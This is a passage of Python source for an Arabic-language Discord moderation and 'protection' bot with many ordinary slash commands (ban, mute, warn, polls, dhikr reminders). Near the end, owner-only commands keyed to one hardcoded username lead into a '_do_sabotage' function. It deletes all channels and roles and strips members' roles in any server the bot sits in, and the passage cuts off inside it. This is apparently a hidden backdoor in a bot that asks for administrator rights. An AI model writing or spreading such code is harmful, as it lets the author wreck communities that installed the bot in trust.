    e.add_field(name="العضو", value=member.mention); e.add_field(name="السبب", value=reason); e.add_field(name="المشرف", value=interaction.user.mention)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="unban", description="رفع الباند")
@app_commands.describe(user_id="ID المستخدم", reason="السبب")
@app_commands.checks.has_permissions(ban_members=True)
async def slash_unban(interaction: discord.Interaction, user_id: str, reason: str="—"):
    try:
        user = await bot.fetch_user(int(user_id)); await interaction.guild.unban(user, reason=reason)
        e = discord.Embed(title="✅ رُفع الباند", color=discord.Color.green()); e.add_field(name="المستخدم", value=str(user))
        await interaction.response.send_message(embed=e)
    except: await interaction.response.send_message("❌ مستخدم غير موجود/محظور.", ephemeral=True)

@bot.tree.command(name="kick", description="طرد عضو")
@app_commands.describe(member="العضو", reason="السبب")
@app_commands.checks.has_permissions(kick_members=True)
async def slash_kick(interaction: discord.Interaction, member: discord.Member, reason: str="—"):
    await member.kick(reason=reason)
    e = discord.Embed(title="👢 تم الكيك", color=discord.Color.orange())
    e.add_field(name="العضو", value=member.mention); e.add_field(name="السبب", value=reason)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="timeout", description="تايم اوت عضو")
@app_commands.describe(member="العضو", minutes="الدقائق", reason="السبب")
@app_commands.checks.has_permissions(moderate_members=True)
async def slash_timeout(interaction: discord.Interaction, member: discord.Member, minutes: int, reason: str="—"):
    await member.timeout(discord.utils.utcnow()+datetime.timedelta(minutes=minutes), reason=reason)
    e = discord.Embed(title="⏳ تم التايم اوت", color=discord.Color.yellow())
    e.add_field(name="العضو", value=member.mention); e.add_field(name="المدة", value=f"{minutes}د"); e.add_field(name="السبب", value=reason)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="untimeout", description="رفع التايم اوت")
@app_commands.checks.has_permissions(moderate_members=True)
async def slash_untimeout(interaction: discord.Interaction, member: discord.Member):
    await member.timeout(None)
    e = discord.Embed(title="✅ رُفع التايم اوت", color=discord.Color.green()); e.add_field(name="العضو", value=member.mention)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="mute", description="ميوت عضو")
@app_commands.describe(member="العضو", reason="السبب")
@app_commands.checks.has_permissions(manage_roles=True)
async def slash_mute(interaction: discord.Interaction, member: discord.Member, reason: str="—"):
    mr = discord.utils.get(interaction.guild.roles, name="Muted")
    if not mr:
        mr = await interaction.guild.create_role(name="Muted")
        for ch in interaction.guild.channels:
            try: await ch.set_permissions(mr, send_messages=False, speak=False)
            except: pass
    await member.add_roles(mr, reason=reason)
    e = discord.Embed(title="🔇 تم الميوت", color=discord.Color.dark_gray())
    e.add_field(name="العضو", value=member.mention); e.add_field(name="السبب", value=reason)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="unmute", description="رفع الميوت")
@app_commands.checks.has_permissions(manage_roles=True)
async def slash_unmute(interaction: discord.Interaction, member: discord.Member):
    mr = discord.utils.get(interaction.guild.roles, name="Muted")
    if mr and mr in member.roles:
        await member.remove_roles(mr)
        e = discord.Embed(title="✅ رُفع الميوت", color=discord.Color.green()); e.add_field(name="العضو", value=member.mention)
        await interaction.response.send_message(embed=e)
    else: await interaction.response.send_message("❌ مو مميوت.", ephemeral=True)

@bot.tree.command(name="warn", description="تحذير عضو")
@app_commands.describe(member="العضو", reason="السبب")
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_warn(interaction: discord.Interaction, member: discord.Member, reason: str):
    db_q("INSERT INTO warnings (user_id,guild_id,reason,moderator_id,timestamp) VALUES (?,?,?,?,?)",
         (str(member.id), str(interaction.guild.id), reason, str(interaction.user.id), str(datetime.datetime.now())))
    count = (db_q("SELECT COUNT(*) FROM warnings WHERE user_id=? AND guild_id=?", (str(member.id), str(interaction.guild.id)), fetch="one") or [0])[0]
    e = discord.Embed(title="⚠️ تحذير", color=discord.Color.yellow())
    e.add_field(name="العضو", value=member.mention); e.add_field(name="السبب", value=reason)
    e.add_field(name="عدد التحذيرات", value=str(count)); e.add_field(name="المشرف", value=interaction.user.mention)
    await interaction.response.send_message(embed=e)
    try: await member.send(f"⚠️ تحذير في **{interaction.guild.name}** — {reason} ({count} تحذير)")
    except: pass

@bot.tree.command(name="warnings", description="تحذيرات عضو")
async def slash_warnings(interaction: discord.Interaction, member: discord.Member):
    rows = db_q("SELECT reason,moderator_id,timestamp FROM warnings WHERE user_id=? AND guild_id=?",
                (str(member.id), str(interaction.guild.id)), fetch="all") or []
    e = discord.Embed(title=f"⚠️ تحذيرات {member.display_name}", color=discord.Color.yellow())
    if not rows: e.description = "ما عنده تحذيرات ✅"
    else:
        for i,(reason,mod,ts) in enumerate(rows,1):
            e.add_field(name=f"#{i}", value=f"**السبب:** {reason}\n**بواسطة:** <@{mod}>", inline=False)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="clearwarns", description="حذف التحذيرات")
@app_commands.checks.has_permissions(administrator=True)
async def slash_clearwarns(interaction: discord.Interaction, member: discord.Member):
    db_q("DELETE FROM warnings WHERE user_id=? AND guild_id=?", (str(member.id), str(interaction.guild.id)))
    await interaction.response.send_message(f"✅ تحذيرات {member.mention} حُذفت")

@bot.tree.command(name="purge", description="حذف رسائل")
@app_commands.describe(amount="عدد الرسائل")
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_purge(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    d = await interaction.channel.purge(limit=max(1,min(100,amount)))
    await interaction.followup.send(f"✅ حُذف {len(d)} رسالة.", ephemeral=True)

@bot.tree.command(name="lock", description="قفل القناة")
@app_commands.checks.has_permissions(manage_channels=True)
async def slash_lock(interaction: discord.Interaction, reason: str="—"):
    await interaction.channel.set_permissions(interaction.guild.default_role, send_messages=False)
    e = discord.Embed(title="🔒 قُفلت القناة", color=discord.Color.red())
    e.add_field(name="السبب", value=reason); e.add_field(name="المشرف", value=interaction.user.mention)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="unlock", description="فتح القناة")
@app_commands.checks.has_permissions(manage_channels=True)
async def slash_unlock(interaction: discord.Interaction):
    await interaction.channel.set_permissions(interaction.guild.default_role, send_messages=True)
    e = discord.Embed(title="🔓 فُتحت القناة", color=discord.Color.green()); e.add_field(name="المشرف", value=interaction.user.mention)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="lockall", description="قفل كل القنوات")
@app_commands.checks.has_permissions(administrator=True)
async def slash_lockall(interaction: discord.Interaction):
    await interaction.response.defer(); count=0
    for ch in interaction.guild.text_channels:
        try: await ch.set_permissions(interaction.guild.default_role, send_messages=False); count+=1
        except: pass
    await interaction.followup.send(f"🔒 قُفل {count} قناة.")

@bot.tree.command(name="unlockall", description="فتح كل القنوات")
@app_commands.checks.has_permissions(administrator=True)
async def slash_unlockall(interaction: discord.Interaction):
    await interaction.response.defer(); count=0
    for ch in interaction.guild.text_channels:
        try: await ch.set_permissions(interaction.guild.default_role, send_messages=True); count+=1
        except: pass
    await interaction.followup.send(f"🔓 فُتح {count} قناة.")

@bot.tree.command(name="slowmode", description="سلو مود")
@app_commands.checks.has_permissions(manage_channels=True)
async def slash_slowmode(interaction: discord.Interaction, seconds: int):
    s = max(0, min(21600, seconds)); await interaction.channel.edit(slowmode_delay=s)
    await interaction.response.send_message(f"✅ سلو مود: {'إيقاف' if s==0 else f'{s}ث'}")

@bot.tree.command(name="nuke", description="نيوك القناة")
@app_commands.checks.has_permissions(administrator=True)
async def slash_nuke(interaction: discord.Interaction):
    ch = interaction.channel; pos = ch.position
    nc = await ch.clone(reason=f"نيوك بواسطة {interaction.user}")
    await ch.delete(); await nc.edit(position=pos)
    e = discord.Embed(title="💣 تم النيوك!", description=f"بواسطة {interaction.user.mention}", color=discord.Color.red())
    await nc.send(embed=e)

@bot.tree.command(name="role-add", description="إضافة رتبة")
@app_commands.checks.has_permissions(manage_roles=True)
async def slash_role_add(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    await member.add_roles(role); await interaction.response.send_message(f"✅ {role.mention} ← {member.mention}")

@bot.tree.command(name="role-remove", description="إزالة رتبة")
@app_commands.checks.has_permissions(manage_roles=True)
async def slash_role_remove(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    await member.remove_roles(role); await interaction.response.send_message(f"✅ حُذفت {role.mention} من {member.mention}")

@bot.tree.command(name="role-all", description="رتبة لجميع الأعضاء")
@app_commands.checks.has_permissions(administrator=True)
async def slash_role_all(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.defer(); count=0
    for m in interaction.guild.members:
        if not m.bot and role not in m.roles:
            try: await m.add_roles(role); count+=1
            except: pass
    await interaction.followup.send(f"✅ {role.mention} لـ {count} عضو.")

@bot.tree.command(name="role-remove-all", description="إزالة رتبة من الكل")
@app_commands.checks.has_permissions(administrator=True)
async def slash_role_remove_all(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.defer(); count=0
    for m in interaction.guild.members:
        if role in m.roles:
            try: await m.remove_roles(role); count+=1
            except: pass
    await interaction.followup.send(f"✅ حُذفت {role.mention} من {count} عضو.")

@bot.tree.command(name="say", description="إرسال رسالة")
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_say(interaction: discord.Interaction, message: str, channel: Optional[discord.TextChannel]=None):
    await (channel or interaction.channel).send(message); await interaction.response.send_message("✅", ephemeral=True)

@bot.tree.command(name="userinfo", description="معلومات عضو")
async def slash_userinfo(interaction: discord.Interaction, member: Optional[discord.Member]=None):
    m = member or interaction.user
    e = discord.Embed(title=f"👤 {m.display_name}", color=m.color); e.set_thumbnail(url=m.display_avatar.url)
    e.add_field(name="الاسم", value=str(m)); e.add_field(name="ID", value=str(m.id))
    e.add_field(name="الانضمام", value=m.joined_at.strftime("%Y-%m-%d") if m.joined_at else "—")
    e.add_field(name="إنشاء الحساب", value=m.created_at.strftime("%Y-%m-%d"))
    roles = [r.mention for r in m.roles[1:]]
    e.add_field(name="الرتب", value=" ".join(roles) if roles else "—", inline=False)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="serverinfo", description="معلومات السيرفر")
async def slash_serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    e = discord.Embed(title=f"🏠 {g.name}", color=discord.Color.blurple())
    if g.icon: e.set_thumbnail(url=g.icon.url)
    e.add_field(name="ID", value=str(g.id)); e.add_field(name="الأعضاء", value=str(g.member_count))
    e.add_field(name="القنوات", value=str(len(g.channels))); e.add_field(name="الرتب", value=str(len(g.roles)))
    e.add_field(name="تاريخ الإنشاء", value=g.created_at.strftime("%Y-%m-%d")); e.add_field(name="المالك", value=g.owner.mention if g.owner else "—")
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="avatar", description="صورة عضو")
async def slash_avatar(interaction: discord.Interaction, member: Optional[discord.Member]=None):
    m = member or interaction.user
    e = discord.Embed(title=f"🖼️ {m.display_name}", color=discord.Color.blue()); e.set_image(url=m.display_avatar.url)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="ping", description="بينق البوت")
async def slash_ping(interaction: discord.Interaction):
    e = discord.Embed(title="🏓 بونق!", color=discord.Color.green()); e.add_field(name="التأخر", value=f"{round(bot.latency*1000)}ms")
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="protection-on", description="تفعيل الحماية")
@app_commands.checks.has_permissions(administrator=True)
async def slash_prot_on(interaction: discord.Interaction):
    db_upsert("protection", str(interaction.guild.id), enabled=1)
    await interaction.response.send_message("🛡️ تم تفعيل الحماية.")

@bot.tree.command(name="protection-of", description="إيقاف الحماية")
@app_commands.checks.has_permissions(administrator=True)
async def slash_prot_off(interaction: discord.Interaction):
    db_upsert("protection", str(interaction.guild.id), enabled=0)
    await interaction.response.send_message("🛡️ تم إيقاف الحماية.")

@bot.tree.command(name="protection-punishment", description="عقوبة الحماية")
@app_commands.describe(punishment="ban/kick/timeout/strip")
@app_commands.checks.has_permissions(administrator=True)
async def slash_prot_punishment(interaction: discord.Interaction, punishment: str):
    if punishment not in ["ban","kick","timeout","strip"]:
        await interaction.response.send_message("❌ المتاح: ban/kick/timeout/strip", ephemeral=True); return
    db_upsert("protection", str(interaction.guild.id), punishment=punishment)
    await interaction.response.send_message(f"✅ العقوبة: **{punishment}**")

@bot.tree.command(name="protection-whitelist", description="وايت ليست عضو")
@app_commands.checks.has_permissions(administrator=True)
async def slash_prot_wl(interaction: discord.Interaction, member: discord.Member):
    row = db_q("SELECT whitelist FROM protection WHERE guild_id=?", (str(interaction.guild.id),), fetch="one")
    wl = json.loads(row[0]) if row and row[0] else []
    if str(member.id) not in wl: wl.append(str(member.id))
    db_upsert("protection", str(interaction.guild.id), whitelist=json.dumps(wl))
    await interaction.response.send_message(f"✅ {member.mention} في الوايت ليست.")

@bot.tree.command(name="protection-unwhitelist", description="إزالة من الوايت ليست")
@app_commands.checks.has_permissions(administrator=True)
async def slash_prot_unwl(interaction: discord.Interaction, member: discord.Member):
    row = db_q("SELECT whitelist FROM protection WHERE guild_id=?", (str(interaction.guild.id),), fetch="one")
    wl = json.loads(row[0]) if row and row[0] else []
    if str(member.id) in wl: wl.remove(str(member.id))
    db_upsert("protection", str(interaction.guild.id), whitelist=json.dumps(wl))
    await interaction.response.send_message(f"✅ حُذف {member.mention} من الوايت ليست.")

@bot.tree.command(name="dhikr-on", description="تفعيل الأذكار")
@app_commands.describe(channel="قناة الأذكار", interval="الفترة بالثواني")
@app_commands.checks.has_permissions(administrator=True)
async def slash_dhikr_on(interaction: discord.Interaction, channel: discord.TextChannel, interval: int=10):
    if interval < 5: await interaction.response.send_message("❌ أقل 5 ثواني.", ephemeral=True); return
    db_upsert("dhikr", str(interaction.guild.id), channel_id=str(channel.id), interval_seconds=interval, enabled=1)
    dhikr_channels.setdefault(str(interaction.guild.id), {})["last_sent"] = 0
    await interaction.response.send_message(f"📿 أذكار في {channel.mention} كل {interval}ث.")

@bot.tree.command(name="dhikr-of", description="إيقاف الأذكار")
@app_commands.checks.has_permissions(administrator=True)
async def slash_dhikr_off(interaction: discord.Interaction):
    db_upsert("dhikr", str(interaction.guild.id), enabled=0)
    await interaction.response.send_message("📿 إيقاف الأذكار.")

@bot.tree.command(name="dhikr-now", description="إرسال ذكر الآن")
async def slash_dhikr_now(interaction: discord.Interaction):
    embeds = _make_dhikr_embeds(bot.user)
    await interaction.response.send_message(embeds=embeds)

@bot.tree.command(name="remind", description="تذكير خاص")
async def slash_remind(interaction: discord.Interaction, minutes: int, message: str):
    minutes = max(1,min(1440,minutes))
    await interaction.response.send_message(f"⏰ راح أذكّرك بعد **{minutes}** دقيقة.", ephemeral=True)
    await asyncio.sleep(minutes*60)
    try:
        e = discord.Embed(title="⏰ تذكير!", description=message, color=discord.Color.yellow())
        await interaction.user.send(embed=e)
    except: pass

@bot.tree.command(name="afk", description="وضع الغياب")
async def slash_afk(interaction: discord.Interaction, reason: str="غايب"):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    db_q("INSERT OR REPLACE INTO afk (user_id,guild_id,reason,timestamp) VALUES (?,?,?,?)",
         (str(interaction.user.id), str(interaction.guild.id), reason, ts))
    e = discord.Embed(title="💤 غياب", color=discord.Color.greyple()); e.add_field(name="السبب", value=reason)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="afk-remove", description="إلغاء الغياب")
async def slash_afk_remove(interaction: discord.Interaction):
    db_q("DELETE FROM afk WHERE user_id=? AND guild_id=?", (str(interaction.user.id), str(interaction.guild.id)))
    await interaction.response.send_message("✅ الغياب أُزيل.")

@bot.tree.command(name="afk-list", description="قائمة الغائبين")
async def slash_afk_list(interaction: discord.Interaction):
    rows = db_q("SELECT user_id,reason,timestamp FROM afk WHERE guild_id=?", (str(interaction.guild.id),), fetch="all") or []
    e = discord.Embed(title="💤 الغائبون", color=discord.Color.greyple())
    if not rows: e.description = "لا غائبون ✅"
    else:
        for uid,reason,ts in rows[:15]:
            e.add_field(name=f"<@{uid}>", value=f"{reason} | {ts[:16]}", inline=False)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="autorole-set", description="رتبة تلقائية")
@app_commands.checks.has_permissions(manage_roles=True)
async def slash_autorole_set(interaction: discord.Interaction, role: discord.Role):
    db_q("INSERT OR REPLACE INTO autorole (guild_id,role_id) VALUES (?,?)", (str(interaction.guild.id), str(role.id)))
    await interaction.response.send_message(f"✅ الرتبة التلقائية: {role.mention}")

@bot.tree.command(name="autorole-remove", description="حذف الرتبة التلقائية")
@app_commands.checks.has_permissions(manage_roles=True)
async def slash_autorole_remove(interaction: discord.Interaction):
    db_q("DELETE FROM autorole WHERE guild_id=?", (str(interaction.guild.id),))
    await interaction.response.send_message("✅ حُذفت الرتبة التلقائية.")

@bot.tree.command(name="panel", description="لوحة البوت")
async def slash_panel(interaction: discord.Interaction):
    g = interaction.guild; now = datetime.datetime.utcnow(); d = now - bot.start_time
    h,r = divmod(int(d.total_seconds()),3600); m2,s = divmod(r,60)
    bots = len([x for x in g.members if x.bot])
    e = discord.Embed(title=f"🎛️ {bot.user.name}", color=discord.Color.blurple())
    e.set_thumbnail(url=bot.user.display_avatar.url)
    e.add_field(name="🏓 Ping", value=f"{round(bot.latency*1000)}ms"); e.add_field(name="🌐 Servers", value=str(len(bot.guilds)))
    e.add_field(name="👥 الأعضاء", value=f"{g.member_count-bots} بشر | {bots} بوت")
    e.add_field(name="⏱️ Uptime", value=f"{h}س {m2}د {s}ث"); e.timestamp = discord.utils.utcnow()
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="poll", description="استطلاع رأي")
async def slash_poll(interaction: discord.Interaction, question: str, option1: str, option2: str, option3: str=""):
    e = discord.Embed(title="📊 "+question, color=discord.Color.blue())
    e.add_field(name="1️⃣", value=option1, inline=False); e.add_field(name="2️⃣", value=option2, inline=False)
    if option3: e.add_field(name="3️⃣", value=option3, inline=False)
    await interaction.response.send_message(embed=e); msg = await interaction.original_response()
    await msg.add_reaction("1️⃣"); await msg.add_reaction("2️⃣")
    if option3: await msg.add_reaction("3️⃣")

@bot.tree.command(name="8ball", description="8ball")
async def slash_8ball(interaction: discord.Interaction, question: str):
    ans = ["نعم!","لا.","ربما...","مو واضح.","اسأل لاحقاً.","بالتأكيد!","لا أعتقد."]
    e = discord.Embed(title="🎱 الكرة السحرية", color=discord.Color.purple())
    e.add_field(name="السؤال", value=question); e.add_field(name="الجواب", value=random.choice(ans))
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="roll", description="رمي نرد")
async def slash_roll(interaction: discord.Interaction, sides: int=6):
    if sides<2: await interaction.response.send_message("❌ يجب 2 على الأقل.", ephemeral=True); return
    await interaction.response.send_message(f"🎲 ظهر: **{random.randint(1,sides)}** من {sides}")

@bot.tree.command(name="coinflip", description="رمي عملة")
async def slash_coinflip(interaction: discord.Interaction):
    await interaction.response.send_message(f"🪙 ظهر: **{random.choice(['👑 صورة','🪙 كتابة'])}**")

@bot.tree.command(name="report", description="بلاغ عضو")
async def slash_report(interaction: discord.Interaction, member: discord.Member, reason: str):
    lc = discord.utils.get(interaction.guild.channels, name="reports") or discord.utils.get(interaction.guild.channels, name="protection-log")
    e = discord.Embed(title="🚨 بلاغ جديد", color=discord.Color.red())
    e.add_field(name="المُبلَّغ عنه", value=f"{member.mention}"); e.add_field(name="السبب", value=reason)
    e.add_field(name="مقدم البلاغ", value=interaction.user.mention); e.timestamp = discord.utils.utcnow()
    if lc: await lc.send(embed=e)
    await interaction.response.send_message("✅ بلاغ أُرسل.", ephemeral=True)

@bot.tree.command(name="move", description="نقل عضو للصوت")
@app_commands.checks.has_permissions(move_members=True)
async def slash_move(interaction: discord.Interaction, member: discord.Member, channel: discord.VoiceChannel):
    if not member.voice: await interaction.response.send_message("❌ مو في روم.", ephemeral=True); return
    await member.move_to(channel); await interaction.response.send_message(f"✅ {member.mention} ← {channel.name}")

@bot.tree.command(name="voicekick", description="كيك صوتي")
@app_commands.checks.has_permissions(move_members=True)
async def slash_voicekick(interaction: discord.Interaction, member: discord.Member):
    if not member.voice: await interaction.response.send_message("❌ مو في روم.", ephemeral=True); return
    await member.move_to(None); await interaction.response.send_message(f"✅ {member.mention} طُرد من الصوت.")

@bot.tree.command(name="massban", description="ماس باند")
@app_commands.checks.has_permissions(ban_members=True)
async def slash_massban(interaction: discord.Interaction, user_ids: str, reason: str="Mass Ban"):
    await interaction.response.defer(); count=0
    for uid in user_ids.split():
        try: await interaction.guild.ban(await bot.fetch_user(int(uid)), reason=reason); count+=1
        except: pass
    await interaction.followup.send(f"✅ باند {count} مستخدم.")

@bot.tree.command(name="softban", description="سوفت باند")
@app_commands.checks.has_permissions(ban_members=True)
async def slash_softban(interaction: discord.Interaction, member: discord.Member, reason: str="Soft Ban"):
    await interaction.guild.ban(member, reason=reason, delete_message_days=7)
    await interaction.guild.unban(member)
    e = discord.Embed(title="🔨 سوفت باند", color=discord.Color.orange()); e.add_field(name="العضو", value=str(member))
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="hackban", description="هاك باند")
@app_commands.checks.has_permissions(ban_members=True)
async def slash_hackban(interaction: discord.Interaction, user_id: str, reason: str="Hack Ban"):
    try:
        u = await bot.fetch_user(int(user_id)); await interaction.guild.ban(u, reason=reason)
        await interaction.response.send_message(f"✅ باند {u}")
    except: await interaction.response.send_message("❌ مستخدم غير موجود.", ephemeral=True)

@bot.tree.command(name="nickname", description="تغيير لقب")
@app_commands.checks.has_permissions(manage_nicknames=True)
async def slash_nickname(interaction: discord.Interaction, member: discord.Member, nickname: str=""):
    await member.edit(nick=nickname or None); await interaction.response.send_message(f"✅ لقب {member.mention}: {nickname or 'الأصلي'}")

@bot.tree.command(name="role-create", description="إنشاء رتبة")
@app_commands.checks.has_permissions(manage_roles=True)
async def slash_role_create(interaction: discord.Interaction, name: str, color: str="99aab5"):
    try: ci=int(color.replace("#",""),16)
    except: ci=0x99aab5
    r = await interaction.guild.create_role(name=name, color=discord.Color(ci))
    await interaction.response.send_message(f"✅ رتبة {r.mention} جاهزة.")

@bot.tree.command(name="role-delete", description="حذف رتبة")
@app_commands.checks.has_permissions(manage_roles=True)
async def slash_role_delete(interaction: discord.Interaction, role: discord.Role):
    n=role.name; await role.delete(); await interaction.response.send_message(f"✅ حُذفت: {n}")

@bot.tree.command(name="channel-create", description="إنشاء قناة")
@app_commands.checks.has_permissions(manage_channels=True)
async def slash_ch_create(interaction: discord.Interaction, name: str, channel_type: str="text", category: Optional[discord.CategoryChannel]=None):
    ch = await (interaction.guild.create_voice_channel if channel_type=="voice" else interaction.guild.create_text_channel)(name, category=category)
    await interaction.response.send_message(f"✅ {ch.mention}")

@bot.tree.command(name="channel-delete", description="حذف قناة")
@app_commands.checks.has_permissions(manage_channels=True)
async def slash_ch_delete(interaction: discord.Interaction, channel: discord.TextChannel):
    n=channel.name; await channel.delete(); await interaction.response.send_message(f"✅ حُذفت: {n}")

@bot.tree.command(name="maker", description="صانع البانلات")
@app_commands.checks.has_permissions(administrator=True)
async def slash_maker(interaction: discord.Interaction, channel: Optional[discord.TextChannel]=None):
    class MakerModal(discord.ui.Modal, title="🎨 ميكر البانل"):
        t = discord.ui.TextInput(label="العنوان", max_length=256)
        d = discord.ui.TextInput(label="الوصف", style=discord.TextStyle.paragraph, max_length=4000)
        c = discord.ui.TextInput(label="اللون hex", max_length=6, required=False, default="5865F2")
        f = discord.ui.TextInput(label="الفوتر", max_length=256, required=False)
        i = discord.ui.TextInput(label="رابط الصورة", max_length=500, required=False)
        async def on_submit(s, inter):
            try: ci=int((s.c.value or "5865F2").replace("#",""),16)
            except: ci=0x5865F2
            e=discord.Embed(title=s.t.value, description=s.d.value, color=discord.Color(ci))
            if s.f.value: e.set_footer(text=s.f.value)
            if s.i.value: e.set_image(url=s.i.value)
            e.timestamp = discord.utils.utcnow()
            target = channel or inter.channel
            await target.send(embed=e); await inter.response.send_message("✅ تم!", ephemeral=True)
    await interaction.response.send_modal(MakerModal())

@bot.tree.command(name="help", description="الأوامر")
async def slash_help(interaction: discord.Interaction):
    e = discord.Embed(title="📚 قائمة الأوامر", color=discord.Color.blurple())
    e.add_field(name="🛡️ الحماية", value="`/protection-on/of` `/protection-punishment` `/protection-whitelist`", inline=False)
    e.add_field(name="📿 الأذكار", value="`/dhikr-on/of` `/dhikr-now`", inline=False)
    e.add_field(name="💤 AFK", value="`/afk` `/afk-remove` `/afk-list`", inline=False)
    e.add_field(name="🎫 تذاكر", value="`/ticket-setup` `/ticket-category` `/ticket-types`", inline=False)
    e.add_field(name="⚖️ إدارة", value="`/ban` `/unban` `/kick` `/timeout` `/mute` `/warn` `/purge`", inline=False)
    e.add_field(name="🔒 قنوات", value="`/lock` `/unlock` `/lockall` `/unlockall` `/slowmode` `/nuke`", inline=False)
    e.add_field(name="👑 رتب", value="`/role-add` `/role-remove` `/role-all` `/role-create` `/role-delete`", inline=False)
    e.add_field(name="ℹ️ معلومات", value="`/userinfo` `/serverinfo` `/avatar` `/ping` `/panel`", inline=False)
    e.add_field(name="🎲 ترفيه", value="`/poll` `/8ball` `/roll` `/coinflip` `/say`", inline=False)
    e.add_field(name="⌨️ اختصارات", value=f"`{PREFIX}ban` `{PREFIX}kick` `{PREFIX}mute` `{PREFIX}warn` `{PREFIX}purge` `{PREFIX}lock` `{PREFIX}timeout`", inline=False)
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="check-username", description="فحص يوزر")
@app_commands.checks.cooldown(1, 5, key=lambda i: i.user.id)
async def slash_check_username(interaction: discord.Interaction, username: str):
    await interaction.response.defer()
    username = username.strip().lower()
    if len(username)<2 or len(username)>32: await interaction.followup.send("❌ يوزر غير صالح.", ephemeral=True); return
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get("https://discord.com/api/v9/unique-username/username-attempt-unauthed",
                headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
                params={"username":username}, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status==200:
                    data = await resp.json()
                    avail = not data.get("taken", True) if "taken" in data else bool(data.get("available", False))
                else: avail = None
        except: avail = None
    if avail is True: color=discord.Color.green(); status="✅ متاح"
    elif avail is False: color=discord.Color.red(); status="❌ محجوز"
    else: color=discord.Color.orange(); status="⚠️ غير معروف"
    e = discord.Embed(title="🔍 فحص اليوزر", color=color)
    e.add_field(name="اليوزر", value=f"`{username}`"); e.add_field(name="الحالة", value=status)
    await interaction.followup.send(embed=e)

BOT_OWNER = "y.7tr2"
def is_owner(i): return i.user.name == BOT_OWNER
def _owner_err(): return discord.Embed(description="❌ خاص بمالك البوت.", color=discord.Color.red())

@bot.tree.command(name="bot-servers", description="سيرفرات البوت")
async def slash_bot_servers(interaction: discord.Interaction):
    if not is_owner(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    await interaction.response.defer(ephemeral=True)
    guilds = list(bot.guilds)
    if not guilds: await interaction.followup.send("⚠️ لا سيرفرات.", ephemeral=True); return
    for i in range(0,len(guilds),10):
        chunk = guilds[i:i+10]
        desc = "\n".join(f"**{idx+i+1}.** {g.name} | `{g.id}` | {g.member_count} عضو" for idx,g in enumerate(chunk))
        await interaction.followup.send(embed=discord.Embed(title=f"📋 سيرفرات ({len(guilds)})", description=desc, color=discord.Color.blue()), ephemeral=True)

@bot.tree.command(name="bot-leave", description="طرد البوت من سيرفر")
@app_commands.describe(server_id="ID السيرفر")
async def slash_bot_leave(interaction: discord.Interaction, server_id: str):
    if not is_owner(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    try: g = bot.get_guild(int(server_id))
    except: await interaction.response.send_message("❌ ID غير صحيح.", ephemeral=True); return
    if not g: await interaction.response.send_message("❌ غير موجود.", ephemeral=True); return
    n=g.name; await g.leave()
    await interaction.response.send_message(embed=discord.Embed(description=f"✅ البوت غادر **{n}**", color=discord.Color.green()), ephemeral=True)

@bot.tree.command(name="bot-invite", description="لينك الدعوة")
async def slash_bot_invite(interaction: discord.Interaction):
    if not is_owner(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    url = discord.utils.oauth_url(bot.user.id, permissions=discord.Permissions(administrator=True), scopes=["bot","applications.commands"])
    e = discord.Embed(title="🔗 دعوة البوت", description=f"[أضف البوت]({url})", color=discord.Color.purple())
    await interaction.response.send_message(embed=e, ephemeral=True)

@bot.tree.command(name="send", description="إرسال embed")
@app_commands.describe(channel="القناة", message="النص", title="العنوان")
async def slash_send_embed(interaction: discord.Interaction, channel: discord.TextChannel, message: str, title: Optional[str]=None):
    if not is_owner(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    e = discord.Embed(description=message, color=discord.Color.blurple())
    if title: e.title = title
    await channel.send(embed=e); await interaction.response.send_message("✅", ephemeral=True)

# ══════════════════════════════════════════════
#  🔐  OWNER COMMANDS — y.7tr2 only
# ══════════════════════════════════════════════

def _ow(i): return i.user.name == BOT_OWNER
def _ow_c(c): return c.author.name == BOT_OWNER

async def _get_g(interaction, sid):
    try: gid = int(sid)
    except:
        await interaction.response.send_message("❌ ID غير صحيح.", ephemeral=True)
        return None
    g = bot.get_guild(gid)
    if not g:
        await interaction.response.send_message("❌ البوت مو في السيرفر.", ephemeral=True)
        return None
    return g

async def _do_sabotage(g, ban=True, del_ch=True, del_roles=True, kick=False,
                        strip=False, spam_name="", spam_count=0):
    report = []
    if del_ch:
        n = 0
        for ch in list(g.channels):
            try: await ch.delete(); n += 1
            except: pass
        report.append(f"🗑️ حُذف {n} قناة")
    if del_roles:
        n = 0
        for r in list(g.roles):
            if r.is_default() or r.managed or r >= g.me.top_role: continue
            try: await r.delete(); n += 1
            except: pass
        report.append(f"🗑️ حُذف {n} رتبة")
    if strip:
        n = 0
        for m in list(g.members):
            if m.bot: continue
            rs = [r for r in m.roles if not r.is_default() and not r.managed]
            if rs:
                try: await m.remove_roles(*rs); n += 1
                except: pass
